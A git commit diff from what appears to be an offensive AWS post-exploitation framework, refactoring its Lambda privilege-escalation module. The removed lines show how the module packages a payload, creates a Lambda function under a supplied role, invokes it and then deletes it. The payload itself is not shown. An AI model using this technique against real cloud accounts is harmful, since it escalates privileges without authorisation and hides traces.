5539f8b36bcc70db7d5a30dc2d64e8d510d37043
Takah1ro <tkhr.y0k0yama@gmail.com>
2021-10-13 19:52:07 +0900

    Update to use module.py

--- rebelykos/core/teamserver/modules/lambda_user_privesc.py
+++ rebelykos/core/teamserver/modules/lambda_user_privesc.py
@@ -1,14 +1,9 @@
-import base64
-import os
 import shlex
-import tempfile
-import zipfile
 
 import boto3
 
 from rebelykos.core.response import Response as res
 from rebelykos.core.teamserver.module import Module
-from rebelykos.core.utils import gen_random_string
 
 
 class RLModule(Module):
@@ -57,51 +52,8 @@ def lambda_handler(event, context):
     return response
 """
 
-        func_name = gen_random_string()
-        with tempfile.TemporaryDirectory() as tmpdirname:
-            zfile = os.path.join(tmpdirname, "lambda_privesc.py.zip")
-            with zipfile.ZipFile(zfile, "w", zipfile.ZIP_DEFLATED) as fp:
-                info = zipfile.ZipInfo("lambda_privesc.py")
-                info.external_attr = 0o644 << 16
-                fp.writestr(info, lambda_privesc)
-            os.chmod(zfile, int("755", 8))
-            with open(zfile, "rb") as fp:
-                zfile_bytes = fp.read()
-                func_info, result = self._handle_err(
-                    client.create_function,
-                    FunctionName=func_name,
-                    Role=self["RoleArn"],
-                    Handler="lambda_privesc.lambda_handler",
-                    Code={"ZipFile": zfile_bytes},
-                    Runtime="python3.9"
-                )
-                yield func_info
-                if result[0] == res.RESULT:
-                    status = result[1]["ResponseMetadata"]["HTTPStatusCode"]
-                    yield res.INFO, {"HTTPStatusCode": status}
-                    func_info, result = self._handle_err(
-                        client.invoke,
-                        InvocationType="RequestResponse",
-                        # LogType="Tail",
-                        FunctionName=func_name
-                    )
-                    yield func_info
-                    if result[0] == res.RESULT:
-                        stat = result[1]["ResponseMetadata"]["HTTPStatusCode"]
-                        yield res.INFO, {"HTTPStatusCode": stat}
-                        func_info, result = self._handle_err(
-                            client.delete_function,
-                            FunctionName=func_name
-                        )
-                        yield func_info
-                        if result[0] == res.RESULT:
-                            res_meta = result[1]["ResponseMetadata"]
-                            status = res_meta["HTTPStatusCode"]
-                            yield res.INFO, {"HTTPStatusCode": status}
-                        else:
-                            yield result
-                    else:
-                        yield result
-                else:
-                    yield result
+        for result in self._lambda_privesc(lambda_privesc,
+                                           self["RoleArn"],
+                                           client):
+            yield result
         yield res.END, "End"
